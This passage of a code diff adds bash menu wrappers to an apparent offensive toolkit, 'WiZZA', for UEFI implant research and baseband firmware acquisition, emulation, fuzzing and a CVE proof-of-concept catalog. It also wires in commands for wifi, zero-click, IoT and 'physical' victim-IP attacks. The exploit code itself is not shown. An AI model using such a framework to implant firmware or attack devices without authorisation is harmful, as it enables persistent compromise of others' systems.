+import json; print(json.dumps(u.setup_qemu_test('${IMPLANT:-}', '$QDIR'), indent=2, default=str))
+"
+            ;;
+        integrity)
+            read -rp "  Current firmware path: " FW
+            read -rp "  Baseline firmware path: " BASE
+            echo -e "${Y}[*] Integrity check: $FW vs $BASE${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from uefi_implant import UEFIResearch
+u = UEFIResearch()
+import json; print(json.dumps(u.firmware_integrity_check('$FW','$BASE'), indent=2, default=str))
+"
+            ;;
+        scan)
+            read -rp "  ESP mount path [/boot/efi]: " ESP; ESP="${ESP:-/boot/efi}"
+            echo -e "${Y}[*] Scanning $ESP for unknown EFI binaries${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from uefi_implant import UEFIResearch
+u = UEFIResearch()
+import json; print(json.dumps(u.scan_esp_for_implants('$ESP'), indent=2, default=str))
+"
+            ;;
+        *)
+            echo "Usage: start uefi [extract|analyze|secureboot|implant|flash|qemu|integrity|scan]"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Baseband Research Framework
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_baseband() {
+    local ACTION="${1:-menu}"
+    local MOD="$DIR/op/modules/baseband_research.py"
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |         WiZZA -- Baseband Research Framework              |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${W}[1]${N} Acquire firmware   (ADB modem dd / OTA sources)"
+            echo -e "  ${W}[2]${N} Identify firmware  (Shannon/Qualcomm/MediaTek)"
+            echo -e "  ${W}[3]${N} Analyze firmware   (NAS tasks, ASN.1 patterns, offsets)"
+            echo -e "  ${W}[4]${N} QEMU emulation     (ARM emulation harness)"
+            echo -e "  ${W}[5]${N} Set up fuzzing     (AFL++ + libFuzzer NAS harnesses)"
+            echo -e "  ${W}[6]${N} CVE catalog + PoC  (CVE-2023-24033, CVE-2021-0920...)"
+            echo ""
+            read -rp "  Select [1-6]: " sel
+            case "$sel" in
+                1) cmd_baseband acquire ;;
+                2) cmd_baseband identify ;;
+                3) cmd_baseband analyze ;;
+                4) cmd_baseband qemu ;;
+                5) cmd_baseband fuzz ;;
+                6) cmd_baseband cve ;;
+            esac
+            ;;
+        acquire)
+            echo -e "${Y}[*] Baseband firmware acquisition${N}"
+            echo -e "  ${W}[1]${N} ADB (rooted device connected via USB)"
+            echo -e "  ${W}[2]${N} OTA (print public firmware sources)"
+            read -rp "  Method [1-2]: " METHOD
+            if [ "$METHOD" = "1" ]; then
+                python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from baseband_research import BasebandResearch
+b = BasebandResearch()
+import json; print(json.dumps(b.acquire_firmware_adb(), indent=2, default=str))
+"
+            else
+                read -rp "  Vendor (samsung/qualcomm/mediatek): " VENDOR
+                python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from baseband_research import BasebandResearch
+b = BasebandResearch()
+import json; print(json.dumps(b.acquire_firmware_ota('$VENDOR'), indent=2, default=str))
+"
+            fi
+            ;;
+        identify)
+            read -rp "  Firmware path: " FW
+            [ -z "$FW" ] && { err "Firmware path required"; return; }
+            echo -e "${Y}[*] Identifying $FW${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from baseband_research import BasebandResearch
+b = BasebandResearch('$FW')
+import json; print(json.dumps(b.identify_firmware(), indent=2, default=str))
+"
+            ;;
+        analyze)
+            read -rp "  Firmware path: " FW
+            [ -z "$FW" ] && { err "Firmware path required"; return; }
+            echo -e "${Y}[*] Analyzing $FW${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from baseband_research import BasebandResearch
+b = BasebandResearch('$FW')
+import json; print(json.dumps(b.analyze_shannon(), indent=2, default=str))
+"
+            ;;
+        qemu)
+            read -rp "  Firmware path: " FW
+            [ -z "$FW" ] && { err "Firmware path required"; return; }
+            read -rp "  Work dir [/tmp/bb_qemu]: " WDIR; WDIR="${WDIR:-/tmp/bb_qemu}"
+            echo -e "${Y}[*] Setting up QEMU emulation for $FW${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from baseband_research import BasebandResearch
+b = BasebandResearch('$FW')
+import json; print(json.dumps(b.setup_qemu_emulation('$WDIR'), indent=2, default=str))
+"
+            ;;
+        fuzz)
+            read -rp "  Firmware path: " FW
+            [ -z "$FW" ] && { err "Firmware path required"; return; }
+            read -rp "  Harness output dir [/tmp/bb_fuzz]: " HDIR; HDIR="${HDIR:-/tmp/bb_fuzz}"
+            echo -e "${Y}[*] Setting up fuzzing harness for $FW${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from baseband_research import BasebandResearch
+b = BasebandResearch('$FW')
+import json; print(json.dumps(b.setup_fuzzing_harness('$HDIR'), indent=2, default=str))
+"
+            echo -e "${Y}[*] To build + run AFL++:${N}"
+            echo "    cd $HDIR && bash build.sh"
+            echo "    afl-fuzz -i seeds/ -o findings/ -- ./nas_fuzz_afl @@"
+            ;;
+        cve)
+            echo -e "${Y}[*] Baseband CVE catalog${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from baseband_research import BasebandResearch
+b = BasebandResearch()
+b.cve_analysis()
+"
+            ;;
+        *)
+            echo "Usage: start baseband [acquire|identify|analyze|qemu|fuzz|cve]"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
 # WiFi Attack
 # ══════════════════════════════════════════════════════════════════════════════
 cmd_wifi() {
@@ -8634,6 +9353,11 @@ case "$CMD" in
     wifi)           init_files; cmd_wifi "$2" "$3" "$4" "$5" ;;
     zeroclick)      init_files; cmd_zeroclick "$2" "$3" "$4" "$5" ;;
     iot)            init_files; cmd_iot "$2" "$3" "$4" "$5" ;;
+    cloud)          init_files; cmd_cloud "$2" "$3" "$4" "$5" ;;
+    stego)          init_files; cmd_stego "$2" "$3" "$4" "$5" ;;
+    adchain)        init_files; cmd_adchain "$2" "$3" "$4" "$5" ;;
+    uefi)           init_files; cmd_uefi "$2" "$3" "$4" "$5" ;;
+    baseband)       init_files; cmd_baseband "$2" "$3" "$4" "$5" ;;
     physical)
         # sudo re-exec entry point: start physical <victim_ip> <target_domain>
         VICTIM_IP="$2"; TARGET_DOMAIN="$3"
